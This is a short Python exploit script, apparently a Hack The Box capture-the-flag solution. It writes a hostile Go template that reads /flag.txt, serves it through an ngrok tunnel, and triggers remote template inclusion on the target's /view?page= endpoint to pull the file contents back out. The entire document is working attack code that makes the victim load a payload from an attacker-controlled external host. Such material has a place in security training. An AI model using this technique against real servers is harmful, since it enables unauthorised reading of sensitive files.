import os
import sys
import time
import requests
import re
import subprocess

url = sys.argv[1]

os.system("mkdir ngrok_payload")
f = open("ngrok_payload/index.tpl", "w")
f.write('<html><body><pre>{{ .OutFileContents "/flag.txt" }}</pre></body></html>')
f.close()

os.chdir("ngrok_payload")
os.system("python3 -m http.server 8000 &")
os.chdir("..")

subprocess.Popen(["ngrok", "http", "8000"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

time.sleep(3)

r = requests.get("http://localhost:4040/api/tunnels")
ngrok = r.json()["tunnels"][0]["public_url"].replace("http://", "https://")

payload = "http://" + url + "/view?page=" + ngrok + "/index.tpl&remote=true"

res = requests.get(payload)
flag = re.search("HTB\\{.*?\\}", res.text)

if flag:
    print("flag: ")
    print("")
    print(flag.group(0))
